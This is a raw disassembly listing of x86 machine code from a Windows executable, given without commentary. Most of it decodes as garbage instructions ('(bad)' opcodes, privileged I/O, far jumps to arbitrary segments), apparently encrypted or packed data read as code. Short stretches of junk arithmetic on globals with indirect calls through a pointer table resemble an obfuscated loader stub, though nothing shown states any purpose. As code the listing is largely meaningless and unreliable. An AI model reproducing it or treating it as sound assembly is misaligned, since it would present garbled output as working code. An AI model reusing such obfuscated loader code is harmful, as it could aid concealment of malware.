  402a78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a79:	clc    
  402a7a:	dec    ebp
  402a7b:	mov    WORD PTR [eax-0x53],es
  402a7e:	sbb    edx,0x6f4803c6
  402a84:	push   edi
  402a85:	mov    ecx,0xb88c7fcf
  402a8a:	and    cl,BYTE PTR [esi+ecx*2]
  402a8d:	cmp    al,0x29
  402a8f:	inc    esi
  402a90:	loope  0x402ad0
  402a92:	cld    
  402a93:	clc    
  402a94:	in     al,0x62
  402a96:	(bad)  
  402a97:	or     al,0x5a
  402a99:	adc    dh,ch
  402a9b:	adc    eax,0xfa7a3376
  402aa0:	jmp    0xbda7:0x1d29aa02
  402aa7:	sar    dl,0x6e
  402aaa:	inc    esi
  402aab:	or     ebx,ecx
  402aad:	test   ebx,ebx
  402aaf:	imul   edi,esi,0x961f7c8c
  402ab5:	es in  eax,0x1c
  402ab8:	and    bh,BYTE PTR [eax-0x1bcee754]
  402abe:	xchg   ebp,eax
  402abf:	sbb    al,ch
  402ac1:	jo     0x402a81
  402ac3:	xor    ebx,DWORD PTR [eax]
  402ac5:	mov    dl,0xa0
  402ac7:	fwait
  402ac8:	stos   BYTE PTR es:[edi],al
  402ac9:	fistp  WORD PTR [esi+ecx*4+0x38]
  402acd:	popf   
  402ace:	mov    cl,0x85
  402ad0:	xchg   ebp,eax
  402ad1:	xor    eax,0xb279b095
  402ad6:	xchg   ebx,eax
  402ad7:	(bad)  
  402ad8:	cmc    
  402ad9:	mov    al,0xe6
  402adb:	cmc    
  402adc:	sbb    DWORD PTR [edi],ecx
  402ade:	inc    esp
  402adf:	xchg   esp,eax
  402ae0:	jl     0x402a78
  402ae2:	(bad)
  402ae5:	mov    ds:0xa0cf86a7,eax
  402aea:	adc    al,0xe5
  402aec:	jg     0x402b3b
  402aee:	jo     0x402af6
  402af0:	push   esp
  402af1:	int    0x9b
  402af3:	jecxz  0x402b50
  402af5:	mov    ebp,0x19a809eb
  402afa:	popa   
  402afb:	xchg   DWORD PTR [edx+0x9544324],edx
  402b01:	std    
  402b02:	sub    dh,BYTE PTR [ebp-0x60105c02]
  402b08:	jmp    0x7c24:0xba0048c7
  402b0f:	push   edi
  402b10:	mov    BYTE PTR [esi-0xc],ch
  402b13:	loop   0x402b70
  402b15:	push   cs
  402b16:	call   0x94891a67
  402b1b:	pop    ds
  402b1c:	outs   dx,BYTE PTR ds:[esi]
  402b1d:	mov    esi,0xb20a3a45
  402b22:	rcl    BYTE PTR [edi],1
  402b24:	mov    edx,DWORD PTR [ecx]
  402b26:	imul   edx,DWORD PTR [edx-0x51553203],0x36
  402b2d:	mov    ah,0xd
  402b30:	scas   eax,DWORD PTR es:[edi]
  402b31:	enter  0xba7d,0x5b
  402b35:	pop    ebp
  402b36:	in     eax,dx
  402b37:	imul   eax,DWORD PTR [esi+esi*1],0x30df08ed
  402b3e:	imul   edx,DWORD PTR [ecx],0xdcd4daea
  402b44:	sbb    esp,ebx
  402b46:	clc    
  402b47:	ins    DWORD PTR es:[edi],dx
  402b48:	mov    ss,WORD PTR [ebp-0x69]
  402b4b:	enter  0x3519,0x33
  402b4f:	ret    
  402b50:	inc    ecx
  402b51:	pop    es
  402b52:	mov    edx,?
  402b54:	xchg   ecx,eax
  402b55:	push   ecx
  402b56:	repnz es cld 
  402b59:	dec    edx
  402b5a:	xchg   esi,eax
  402b5b:	inc    esp
  402b5c:	mov    bh,0xbc
  402b5e:	mov    DWORD PTR [eax+0x77],ebp
  402b61:	pop    ss
  402b62:	mov    dl,0x7a
  402b64:	pop    ss
  402b65:	mov    edi,0xfd254c28
  402b6a:	push   ecx
  402b6b:	push   eax
  402b6c:	push   0xddf
  402b71:	sbb    DWORD PTR ds:0x428357,0x41e0
  402b7b:	push   0x2d0f
  402b80:	call   0x42202c
  402b85:	mov    ecx,DWORD PTR [ebp-0x68]
  402b88:	not    edx
  402b8a:	mov    edx,DWORD PTR [ebp-0x64]
  402b8d:	cmp    DWORD PTR ds:0x428243,0x0
  402b94:	mov    edx,DWORD PTR ds:0x428357
  402b9a:	mov    DWORD PTR ds:0x42814f,0x2873
  402ba4:	movzx  edx,WORD PTR ds:0x4281f3
  402bab:	jmp    0x402c06
  402bb0:	mov    DWORD PTR ds:0x4282cb,ebx
  402bb6:	cmp    DWORD PTR ds:0x428243,0x0
  402bbd:	jb     0x402be8
  402bc3:	push   DWORD PTR [ebp-0x1c]
  402bc6:	call   DWORD PTR ds:0x428d44
  402bcc:	mov    edx,DWORD PTR ds:0x428253
  402bd2:	add    DWORD PTR ds:0x42822b,edx
  402bd8:	mov    DWORD PTR ds:0x4282cf,0x7648
  402be2:	adc    edx,DWORD PTR ds:0x42820b
  402be8:	mov    edx,DWORD PTR ds:0x4282db
  402bee:	sbb    DWORD PTR ds:0x428267,edx
  402bf4:	mov    edx,DWORD PTR ds:0x428223
  402bfa:	xor    DWORD PTR ds:0x4282e7,edx
  402c00:	and    edx,DWORD PTR ds:0x4282bf
  402c06:	xor    eax,ecx
  402c08:	mov    ecx,DWORD PTR [ebp-0x70]
  402c0b:	xor    edx,0x594e
  402c11:	mov    edx,DWORD PTR [ebp-0x6c]
  402c14:	add    DWORD PTR ds:0x4281eb,0x7b5b
  402c1e:	sub    eax,ecx
  402c20:	mov    ecx,DWORD PTR ds:0x428193
  402c26:	mov    ecx,DWORD PTR [ecx]
  402c28:	and    DWORD PTR ds:0x42821b,ecx
  402c2e:	mov    ecx,DWORD PTR ds:0x422548
  402c34:	or     DWORD PTR ds:0x428113,0x509d
  402c3e:	lea    eax,[eax+ecx*1-0x27d2]
  402c45:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c48:	mov    edx,DWORD PTR [ebp-0x2c]
  402c4b:	sbb    DWORD PTR ds:0x4282bb,0x9f0
  402c55:	or     ecx,0x4f00
  402c5b:	add    DWORD PTR ds:0x42834f,0x42832b
  402c65:	jmp    0x403043
  402c6a:	nop
  402c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6c:	(bad)  
  402c6d:	call   0x1caec68c
  402c72:	int    0x3e
  402c74:	cmp    DWORD PTR [eax+eax*8+0x28],0xe
  402c79:	jle    0x402c31
  402c7b:	hlt    
  402c7c:	sbb    BYTE PTR [eax],bl
  402c7e:	sahf   
  402c7f:	adc    bl,BYTE PTR [eax]
  402c81:	sbb    bh,bl
  402c83:	and    esi,esi
  402c85:	stc    
  402c86:	xor    BYTE PTR [edx-0x6a],ah
  402c89:	sub    DWORD PTR [esi],esp
  402c8b:	add    BYTE PTR [edi-0x53],cl
  402c8e:	into   
  402c8f:	cwde   
  402c90:	or     al,0x38
  402c92:	sub    eax,ebp
  402c94:	fild   QWORD PTR [ecx+ecx*4+0x7b764109]
  402c9b:	sbb    BYTE PTR [eax+ebp*2-0x21],dh
  402c9f:	cmp    DWORD PTR [ebx-0x4],0xcca31f1c
  402ca6:	xchg   DWORD PTR [ebx],edi
  402ca8:	xchg   edi,eax
  402ca9:	jle    0x402c81
  402cab:	push   ebx
  402cac:	cmp    BYTE PTR [edi],ch
  402cae:	or     ebp,DWORD PTR [edx+0x630ffcea]
  402cb4:	mov    ds:0x642cad6f,al
  402cb9:	mov    cl,0x7f
  402cbb:	sub    esp,eax
  402cbd:	fld    TBYTE PTR [ebp+0x4f5ab811]
  402cc3:	(bad)
  402cc7:	xchg   ebp,eax
  402cc8:	jecxz  0x402ce2
  402cca:	jb     0x402cd2
  402ccc:	push   ebx
  402ccd:	push   ss
  402cce:	daa    
  402ccf:	loope  0x402cf4
  402cd1:	repz mov esp,0xda48f57d
  402cd7:	xchg   edi,eax
  402cd8:	push   esi
  402cd9:	inc    ebp
  402cda:	call   0xc0dd01e9
  402cdf:	cld    
  402ce0:	and    BYTE PTR [eax],dh
  402ce2:	mov    cl,0x8a
  402ce4:	inc    edi
  402ce5:	loop   0x402c72
  402ce7:	in     eax,dx
  402ce8:	neg    DWORD PTR [eax-0xc]
  402ceb:	dec    ecx
  402cec:	xor    DWORD PTR [ebp-0x64be3491],eax
  402cf2:	pusha  
  402cf3:	xor    ch,BYTE PTR [edi+ebx*4-0x5e]
  402cf7:	aas    
  402cf8:	fnstcw WORD PTR [ebx+eiz*2]
  402cfb:	repnz sar DWORD PTR [esi-0x495574f7],1
  402d02:	mov    al,0x93
  402d04:	mov    cr7,ebp
  402d07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d08:	nop
  402d09:	adc    DWORD PTR [ecx+0x4d],ecx
  402d0c:	sbb    al,dl
  402d0e:	enter  0xca5f,0xfb
  402d12:	repz or edx,DWORD PTR [ecx]
  402d15:	pop    ds
  402d16:	jg     0x402d07
  402d18:	test   al,0xf1
  402d1a:	mov    bh,0xc6
  402d1c:	or     ah,al
  402d1e:	or     bh,BYTE PTR [si-0x2b48]
  402d23:	and    eax,0xb3c613a2
  402d28:	sbb    DWORD PTR [eax-0x120a5914],ecx
  402d2e:	mov    ch,dh
  402d30:	push   ecx
  402d31:	jmp    0x5edb4df6
  402d36:	sub    eax,0x92d2b93c
  402d3b:	add    al,0x96
  402d3d:	jge    0x402d56
  402d3f:	daa    
  402d40:	sti    
  402d41:	and    eax,0x38e923a
  402d46:	mov    es,WORD PTR [edi+0x4c]
  402d49:	stc    
  402d4a:	mov    WORD PTR [ebx-0x18f3672d],?
  402d50:	jecxz  0x402cd9
  402d52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d53:	scas   eax,DWORD PTR es:[edi]
  402d54:	mov    edi,0xbd31196e
  402d59:	sar    DWORD PTR [ecx+edi*1+0x45],0x0
  402d5e:	lods   eax,DWORD PTR ds:[esi]
  402d5f:	inc    esi
  402d60:	loope  0x402de0
  402d62:	aas    
  402d63:	jmp    FWORD PTR [edx-0x66]
  402d66:	inc    esi
  402d67:	mov    esi,0x1d0d8d54
  402d6c:	icebp  
  402d6d:	inc    eax
  402d6e:	inc    esi
  402d6f:	add    edx,ebp
  402d71:	dec    edi
  402d72:	inc    eax
  402d73:	inc    ebx
  402d74:	add    eax,0xbee1056
  402d79:	mov    esi,0xcd7cb435
  402d7e:	or     BYTE PTR [eax+0x8500a94],bl
  402d84:	ror    DWORD PTR [esi],cl
  402d86:	mov    eax,ds:0x13cf4570
  402d8b:	xlat   BYTE PTR ds:[ebx]
  402d8c:	mov    WORD PTR [edi+0x71],fs
  402d8f:	add    ebx,ebp
  402d91:	iret   
  402d92:	in     al,dx
  402d93:	fdivr  QWORD PTR [edx]
  402d95:	adc    dl,BYTE PTR [edx-0x7d]
  402d98:	lahf   
  402d99:	xchg   edx,eax
  402d9a:	fadd   DWORD PTR [ebp+0x1]
  402d9d:	aad    0x57
  402d9f:	xor    ebx,DWORD PTR [esi-0x1d64a7c4]
  402da5:	mov    cl,0x80
  402da7:	(bad)  
  402da8:	out    0x13,al
  402daa:	test   DWORD PTR [ebx-0x2117aed7],ebx
  402db0:	js     0x402dc1
  402db2:	sbb    edi,esi
  402db4:	stc    
  402db5:	push   edi
  402db6:	pop    edi
  402db7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402db8:	retf   
  402db9:	push   esp
  402dba:	or     bl,ch
  402dbc:	pop    edx
  402dbd:	(bad)  
  402dbe:	ret    0xbc6f
  402dc1:	lock (bad) 
  402dc3:	push   0xefc57796
  402dc8:	push   edx
  402dc9:	xchg   dl,ch
  402dcb:	test   BYTE PTR [eax+0x68],0x78
  402dcf:	(bad)  
  402dd0:	and    bh,ch
  402dd2:	jns    0x402d7a
  402dd4:	and    BYTE PTR [eax+0x6c],0xda
  402dd8:	add    al,0x15
  402dda:	adc    edi,DWORD PTR [ecx+0x36]
  402ddd:	or     al,0x15
  402ddf:	gs ds pop esi
  402de2:	ja     0x402dee
  402de4:	cmp    esi,DWORD PTR [esi]
  402de6:	jge    0x402dac
  402de8:	test   BYTE PTR [eax-0x70d10633],dh
  402dee:	dec    eax
  402def:	fbstp  TBYTE PTR [edi+0x1b3966dd]
  402df5:	pop    ds
  402df6:	repz stc 
  402df8:	add    DWORD PTR [ecx+0x62],ebx
  402dfb:	(bad)  
  402dfc:	pop    ecx
  402dfd:	and    esi,DWORD PTR [ebx]
  402dff:	lahf   
  402e00:	and    bh,BYTE PTR [ecx+0x33d595ea]
  402e06:	bound  ecx,QWORD PTR [edi+0x4349b48b]
  402e0c:	inc    edi
  402e0d:	pop    ds
  402e0e:	aaa    
  402e0f:	dec    ebp
  402e10:	xchg   esp,eax
  402e11:	mov    bl,0x59
  402e13:	xor    al,0xde
  402e15:	cmp    ah,ah
  402e17:	push   edi
  402e18:	dec    edi
  402e19:	xchg   DWORD PTR [ecx-0x4114114e],esp
  402e1f:	push   cs
  402e20:	push   esi
  402e21:	jnp    0x402e6c
  402e23:	ins    BYTE PTR es:[edi],dx
  402e24:	fist   WORD PTR ds:[ebp+0x7456c207]
  402e2b:	xchg   edi,eax
  402e2c:	inc    eax
  402e2d:	dec    edi
  402e2e:	add    al,0x20
  402e30:	jg     0x402e2f
  402e32:	in     eax,0xe0
  402e34:	enter  0xe78c,0x6d
  402e38:	popf   
  402e39:	push   ss
  402e3a:	push   esp
  402e3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e3c:	fxch   st(2)
  402e3e:	pop    ss
  402e3f:	bound  ebp,QWORD PTR [eax-0x1d]
  402e42:	add    al,0x26
  402e44:	inc    esi
  402e45:	and    BYTE PTR [eax+edi*8+0x2f],bl
  402e49:	icebp  
  402e4a:	out    0xd3,eax
  402e4c:	jge    0x402e9b
  402e4e:	cmp    ah,BYTE PTR [edi+0x27]
  402e51:	mov    bh,0xcb
  402e53:	inc    edx
  402e54:	sub    bh,BYTE PTR [esi]
  402e56:	xlat   BYTE PTR ds:[ebx]
  402e57:	push   ds
  402e58:	adc    BYTE PTR [ebp-0x5a],0x31
  402e5c:	inc    ecx
  402e5d:	mov    ebp,0x8714ba1f
  402e62:	xor    eax,0x9dfe5535
  402e67:	jbe    0x402ee6
  402e69:	or     esp,DWORD PTR [ebx]
  402e6b:	aam    0x4
  402e6d:	adc    cl,BYTE PTR [edi+0x79]
  402e70:	fwait
  402e71:	mov    WORD PTR [eax-0x2],?
  402e74:	xchg   BYTE PTR [eax],bl
  402e76:	mov    dh,0x86
  402e78:	rcl    BYTE PTR [ebp+0x74],0x2e
  402e7c:	retf   0xf1e4
  402e7f:	inc    eax
  402e80:	pop    edi
  402e81:	sbb    BYTE PTR [ecx-0x30],dh
  402e84:	dec    esp
  402e85:	shl    BYTE PTR [ebp-0x79],0x6
  402e89:	sahf   
  402e8a:	lods   eax,DWORD PTR ds:[esi]
  402e8b:	xchg   edx,eax
  402e8c:	fsubr  DWORD PTR [ebx]
  402e8e:	and    esp,DWORD PTR [ebp*1-0x74f58d00]
  402e95:	push   esi
  402e96:	stos   BYTE PTR es:[edi],al
  402e97:	call   0xa156:0xc5ffaf24
  402e9e:	xor    DWORD PTR [edx-0x5b2d3d70],ebx
  402ea4:	lock inc eax
  402ea6:	scas   eax,DWORD PTR es:[edi]
  402ea7:	jnp    0x402f00
  402ea9:	sbb    eax,0xeeab921
  402eae:	(bad)  
  402eaf:	outs   dx,BYTE PTR ds:[esi]
  402eb0:	into   
  402eb1:	or     ebp,DWORD PTR [edx-0x67]
  402eb4:	xchg   ebp,eax
  402eb5:	mov    edx,0x5b7a39d4
  402eba:	int    0xfc
  402ebc:	and    BYTE PTR [edi],bl
  402ebe:	mov    al,ds:0xb66efb9a
  402ec3:	gs repz and ebp,0x40
  402ec8:	sub    DWORD PTR [eax-0x1f43a87d],esi
  402ece:	iret   
  402ecf:	dec    ebp
  402ed0:	xor    BYTE PTR [ecx+0x62],0x11
  402ed4:	xchg   esi,eax
  402ed5:	dec    ebx
  402ed6:	lahf   
  402ed7:	mov    edi,0xc2ac061c
  402edc:	mov    cl,0x98
  402ede:	fs mov al,0x83
  402ee1:	rcr    BYTE PTR [ebp+0x6d],cl
  402ee4:	stc    
  402ee5:	scas   eax,DWORD PTR es:[edi]
  402ee6:	mov    al,0xbe
  402ee8:	rol    esp,cl
  402eea:	(bad)  
  402eeb:	popf   
  402eec:	lods   al,BYTE PTR ds:[esi]
  402eed:	out    dx,al
  402eee:	shl    BYTE PTR ds:0xa3947910,0xc2
  402ef5:	xor    BYTE PTR [edx-0xb7a5135],cl
  402efb:	(bad)  
  402efd:	pop    ebp
  402efe:	loopne 0x402ecb
  402f00:	or     eax,0xaa4890b7
  402f05:	loop   0x402f4e
  402f07:	sub    ch,BYTE PTR [esi+0x3]
  402f0a:	stos   BYTE PTR es:[edi],al
  402f0b:	(bad)  
  402f0c:	jle    0x402f00
  402f0e:	and    eax,DWORD PTR [eax]
  402f10:	mov    db2,esp
  402f13:	rcr    DWORD PTR [ebx+0x17a565c2],cl
  402f19:	add    bl,dl
  402f1b:	sbb    al,0x24
  402f1d:	das    
  402f1e:	aam    0x2f
  402f20:	fdiv   st,st(4)
  402f22:	xlat   BYTE PTR ds:[ebx]
  402f23:	pcmpeqb mm3,QWORD PTR [eax+0x27424ed3]
  402f2a:	jmp    0x1be:0xd6a38103
  402f31:	fs push esp
  402f33:	aam    0x2f
  402f35:	adc    edx,DWORD PTR [eax-0x2e]
  402f38:	dec    esi
  402f39:	sbb    eax,0x28d66ce0
  402f3e:	adc    ebx,DWORD PTR [edi]
  402f40:	mov    BYTE PTR [eax-0x72e529a1],al
  402f46:	and    DWORD PTR [edi+0x4a8a393e],ebx
  402f4c:	sub    DWORD PTR [ebp-0x749f892e],esi
  402f52:	je     0x402f26
  402f54:	xor    cl,dl
  402f56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f57:	fbld   TBYTE PTR [edi+0x62a17d4d]
  402f5d:	ret    
  402f5e:	dec    ebx
  402f5f:	ror    DWORD PTR [ecx],0x9b
  402f62:	scas   al,BYTE PTR es:[edi]
  402f63:	arpl   WORD PTR [edx+0x65771f4f],bp
  402f69:	fst    st(3)
  402f6b:	iret   
  402f6c:	retf   0x5258
  402f6f:	outs   dx,BYTE PTR es:[esi]
  402f71:	lods   al,BYTE PTR ds:[esi]
  402f72:	and    esp,DWORD PTR [ebx]
  402f74:	into   
  402f75:	mov    edi,eax
  402f77:	jle    0x402fde
  402f79:	dec    edi
  402f7a:	push   eax
  402f7b:	out    dx,al
  402f7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f7d:	cmp    bh,BYTE PTR [ebx+0x2]
  402f80:	loop   0x402f9d
  402f82:	and    eax,0xa988120b
  402f87:	mov    ch,0xf8
  402f89:	int    0xa2
  402f8b:	and    BYTE PTR [eax+0x3d],ch
  402f8e:	mov    esi,0x6c3307b3
  402f93:	sbb    eax,DWORD PTR [esi]
  402f95:	mov    cl,0xd8
  402f97:	pop    esi
  402f99:	or     dl,BYTE PTR [edx]
  402f9b:	push   0x12
  402f9d:	xor    ecx,DWORD PTR [ecx-0x1d]
  402fa0:	mov    al,0x37
  402fa2:	call   FWORD PTR [edi]
  402fa4:	sbb    al,0xf0
  402fa6:	adc    DWORD PTR [edi+0x227ec775],edx
  402fac:	test   al,0xff
  402fae:	inc    eax
  402faf:	adc    DWORD PTR [esp+ebx*8],ebx
  402fb2:	push   ebp
  402fb3:	sar    DWORD PTR [esi-0x4c],cl
  402fb6:	mov    dl,0x2e
  402fb8:	or     DWORD PTR [ebp-0x4123b85a],edx
  402fbe:	push   ecx
  402fbf:	mov    bh,dh
  402fc1:	cmp    DWORD PTR [edi],0x45
  402fc4:	jg     0x402fae
  402fc6:	sbb    esi,0x17
  402fc9:	sub    ebp,edi
  402fcb:	bound  edx,QWORD PTR [edi]
  402fcd:	(bad)  
  402fce:	jge    0x40303c
  402fd0:	add    DWORD PTR [edi],eax
  402fd2:	data16 repz adc BYTE PTR [eax+0x7a],ah
  402fd7:	sahf   
  402fd8:	dec    ebx
  402fd9:	xor    esp,DWORD PTR [edi]
  402fdb:	add    BYTE PTR [edx],dh
  402fdd:	iret   
  402fde:	mov    cl,0xf9
  402fe0:	nop
  402fe1:	imul   eax,DWORD PTR [eax+edi*2-0x1bb76efc],0x5f
  402fe9:	add    al,al
  402feb:	inc    esp
  402fec:	retf   0xbac9
  402fef:	xchg   ecx,eax
  402ff0:	pop    ss
  402ff1:	xchg   esi,eax
  402ff2:	xchg   ebx,eax
  402ff3:	scas   al,BYTE PTR es:[edi]
  402ff4:	adc    ebx,DWORD PTR [eax+edx*4+0x6b3b3fc5]
  402ffb:	fcmovb st,st(2)
  402ffd:	addr16 (bad) 
  402fff:	lods   eax,DWORD PTR ds:[esi]
  403000:	sub    ecx,ebp
  403002:	dec    esp
  403003:	dec    ebx
  403004:	(bad)  
  403005:	and    DWORD PTR [ecx+0x76],ebx
  403008:	dec    ecx
  403009:	dec    esp
  40300a:	lea    ebp,[eax+0x55]
  40300d:	adc    ebx,ebx
  40300f:	cmp    BYTE PTR [eax+0x4a],cl
  403012:	push   ds
  403013:	gs push ds
  403015:	dec    ebp
  403016:	ins    BYTE PTR es:[edi],dx
  403017:	pusha  
  403018:	repz inc esi
  40301a:	fs pop ds
  40301c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40301d:	scas   al,BYTE PTR es:[edi]
  40301e:	pop    ebp
  40301f:	mov    al,BYTE PTR ds:0xd277328e
  403025:	ds mov ebp,0xa546b3ea
  40302b:	adc    eax,0xcf52bba
  403030:	lods   eax,DWORD PTR ds:[esi]
  403031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403032:	push   ss
  403033:	push   cs
  403034:	add    eax,0xd31c82c7
  403039:	sbb    BYTE PTR [ebp+edx*8-0xe292e16],0xa6
  403041:	retf   
  403042:	inc    eax
  403043:	and    ecx,edx
  403045:	add    edx,0x3463
  40304b:	mov    edx,DWORD PTR [ebp-0x34]
  40304e:	or     ecx,edx
  403050:	xor    ecx,0x5fdd
  403056:	cmp    ecx,DWORD PTR [eax]
  403058:	mov    DWORD PTR ds:0x42825b,0x665d
  403062:	jne    0x40a9b0
  403068:	mov    ecx,DWORD PTR [esi]
  40306a:	cmp    DWORD PTR ds:0x42835f,0x0
  403071:	mov    DWORD PTR ds:0x428363,edx
  403077:	mov    DWORD PTR ds:0x4282ab,0x1413
  403081:	mov    edx,DWORD PTR ds:0x428353
  403087:	jmp    0x4030db
  40308c:	mov    DWORD PTR ds:0x42811f,0x4beb
  403096:	not    eax
  403098:	cmp    DWORD PTR ds:0x42835f,0x0
  40309f:	jl     0x4030c1
  4030a5:	push   DWORD PTR [ebp-0x20]
  4030a8:	push   DWORD PTR [ebp-0xc]
  4030ab:	call   DWORD PTR ds:0x428d64
  4030b1:	mov    DWORD PTR ds:0x42820b,0x4e29
  4030bb:	inc    DWORD PTR ds:0x42822f
  4030c1:	or     edx,DWORD PTR ds:0x4282cb
  4030c7:	add    edx,DWORD PTR ds:0x42814f
  4030cd:	sub    edx,edx
  4030cf:	add    DWORD PTR ds:0x428357,edx
  4030d5:	sbb    edx,DWORD PTR ds:0x4282df
  4030db:	mov    eax,DWORD PTR [esi+0x4]
  4030de:	sbb    edx,DWORD PTR ds:0x428343
  4030e4:	shrd   ecx,eax,0x2
  4030e8:	shr    eax,0x2
  4030eb:	mov    eax,DWORD PTR [esi]
  4030ed:	xor    DWORD PTR ds:0x428363,edx
  4030f3:	mov    edx,DWORD PTR [esi+0x4]
  4030f6:	neg    DWORD PTR ds:0x42811b
  4030fc:	shl    eax,0x1e
  4030ff:	xor    ecx,edi
  403101:	xor    eax,eax
  403103:	sbb    DWORD PTR ds:0x428367,0x1e67
  40310d:	or     eax,ecx
  40310f:	jmp    0x4034ed
  403114:	and    al,0xd6
  403116:	push   esp
  403117:	repnz and dh,BYTE PTR [ebx+0x22]
  40311b:	inc    esi
  40311c:	sar    BYTE PTR [eax-0x73],1
  40311f:	jo     0x403119
  403121:	push   ds
  403122:	sub    eax,0x18ec3dbe
  403127:	sbb    BYTE PTR [esi+0x40181812],bl
  40312d:	inc    ebp
  40312e:	pop    esi
  40312f:	neg    BYTE PTR [ebx]
  403131:	or     al,0x79
  403133:	sbb    BYTE PTR [ecx+eiz*8],0x42
  403137:	pop    ss
  403138:	psraw  mm3,QWORD PTR [edx]
  40313b:	dec    edi
  40313c:	or     eax,0xaa048288
  403141:	out    0x64,eax
  403143:	or     al,0xc8
  403145:	test   BYTE PTR [edx+ebx*4],dl
  403148:	hlt    
  403149:	addr16 xchg ecx,eax
  40314b:	and    eax,0xd29aaf58
  403150:	lods   eax,DWORD PTR ds:[esi]
  403151:	(bad)  
  403152:	jl     0x4030f4
  403154:	cmp    BYTE PTR [ebp-0x63],bl
  403157:	add    ax,0x6426
  40315b:	add    DWORD PTR [ebx+eax*4+0x6c],ecx
  40315f:	sub    al,0x4f
  403161:	sub    ebp,ecx
  403163:	sbb    eax,0x3bf9513b
  403168:	pop    ds
  403169:	repnz nop
  40316b:	div    BYTE PTR [edx]
  40316d:	mov    ch,0xdc
  40316f:	adc    esi,DWORD PTR [edi-0x1d1eaad6]
  403175:	mov    cl,0x2
  403177:	cmp    DWORD PTR [ecx+edi*2],ebp
  40317a:	pop    eax
  40317b:	cmp    bh,BYTE PTR [eax-0x1a]
  40317e:	jbe    0x403131
  403180:	xchg   edi,eax
  403181:	loop   0x4031ff
  403183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403184:	adc    ah,BYTE PTR [ecx-0x48]
  403187:	enter  0x7192,0x5d
  40318b:	std    
  40318c:	popa   
  40318d:	cs mov bh,0x15
  403190:	jbe    0x40314d
  403192:	sub    eax,0x6bdee5a4
  403197:	adc    BYTE PTR [eax+0x66],0xe2
  40319b:	adc    bh,bl
  40319d:	gs aad 0x98
  4031a0:	sbb    BYTE PTR [edi-0x16ec0e66],bh
  4031a6:	dec    DWORD PTR [ebx-0x76]
  4031a9:	jb     0x4031ce
  4031ab:	and    eax,0x18d39a24
  4031b0:	fidivr WORD PTR [ecx-0x4587e875]
  4031b6:	pusha  
  4031b7:	jns    0x403219
  4031b9:	and    BYTE PTR [esi],bh
  4031bb:	icebp  
  4031bc:	jecxz  0x403186
  4031be:	push   esp
  4031bf:	add    esp,ebx
  4031c1:	(bad)  
  4031c2:	cld    
  4031c3:	jp     0x403200
  4031c5:	mov    al,ds:0x8a7e4040
  4031ca:	int    0xa4
  4031cc:	iret   
  4031cd:	test   DWORD PTR [esi+0xd09f73],esp
  4031d3:	dec    esi
  4031d4:	add    al,0x39
  4031d6:	xchg   ebx,eax
  4031d7:	aad    0x55
  4031d9:	lods   eax,DWORD PTR ds:[esi]
  4031da:	sub    cl,dl
  4031dc:	push   cs
  4031dd:	jo     0x403209
  4031df:	adc    ah,cl
  4031e1:	pop    esi
  4031e2:	ret    0xc5e
  4031e5:	push   0x2cd28c66
  4031ea:	dec    edx
  4031eb:	xor    eax,0x4d905d37
  4031f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031f2:	test   BYTE PTR [ebx-0x77],bh
  4031f5:	stos   BYTE PTR es:[edi],al
  4031f6:	test   BYTE PTR [ecx+edx*1-0x456481a3],ah
  4031fd:	enter  0x20,0xd8
  403201:	mov    al,0x9d
  403203:	stc    
  403204:	fimul  WORD PTR [ebx]
  403206:	repnz out 0x1a,al
  403209:	mov    ch,0x80
  40320b:	ins    DWORD PTR es:[edi],dx
  40320c:	fild   WORD PTR [edi]
  40320e:	add    eax,0x2136bbf4
  403213:	mov    esi,0xf5e9851d
  403218:	scas   eax,DWORD PTR es:[edi]
  403219:	xchg   edi,eax
  40321a:	cmp    BYTE PTR [edi+0x63],0x3a
  40321e:	jg     0x403293
  403220:	loopne 0x403253
  403222:	neg    BYTE PTR es:[eax-0x16]
  403226:	pusha  
  403227:	sub    eax,0x46a3e850
  40322c:	nop
  40322d:	cmc    
  40322e:	stos   DWORD PTR es:[edi],eax
  40322f:	and    BYTE PTR [ecx+0x38ba2399],0x62
  403236:	in     al,dx
  403237:	call   0x1b24:0x37a864eb
  40323e:	(bad)  
  40323f:	das    
  403240:	out    dx,eax
  403241:	stc    
  403242:	nop
  403243:	xchg   ebx,eax
  403244:	mov    BYTE PTR [ebx+ebp*1+0x3375de1d],ah
  40324b:	push   cs
  40324c:	scas   eax,DWORD PTR es:[edi]
  40324d:	mov    ds:0x92c2f9d,al
  403252:	pop    eax
  403253:	push   ebp
  403254:	pushf  
  403255:	dec    ebx
  403256:	push   edx
  403257:	sbb    bl,BYTE PTR [edx-0x30551a4f]
  40325d:	or     eax,0xd9a6c02d
  403262:	add    dl,BYTE PTR [ebp+0x60]
  403265:	sub    edx,DWORD PTR [edi-0x51]
  403268:	fiadd  WORD PTR [ecx-0x32]
  40326b:	(bad)  
  40326d:	push   ebx
  40326e:	nop
  40326f:	adc    dl,BYTE PTR [ecx+ecx*2-0x6bf7593e]
  403276:	mov    BYTE PTR ds:0x502e2875,0xea
  40327d:	adc    al,0x72
  40327f:	lods   al,BYTE PTR ds:[esi]
  403280:	mov    al,ds:0xc4ff3bb2
  403285:	add    eax,0x71ce1f3b
  40328a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40328b:	push   esi
  40328d:	idiv   BYTE PTR [ecx]
  40328f:	jge    0x4032a4
  403291:	cwde   
  403292:	inc    ecx
  403293:	mov    ecx,edi
  403295:	mov    ds:0x879d9c18,eax
  40329a:	xchg   ecx,eax
  40329b:	jle    0x403234
  40329d:	push   ds
  40329e:	cmp    ecx,ebx
  4032a0:	stos   DWORD PTR es:[edi],eax
  4032a1:	dec    edi
  4032a2:	bound  ebx,QWORD PTR [ecx+0x21]
  4032a5:	les    eax,FWORD PTR [ebp+0x7eb3e62d]
  4032ab:	xchg   edx,eax
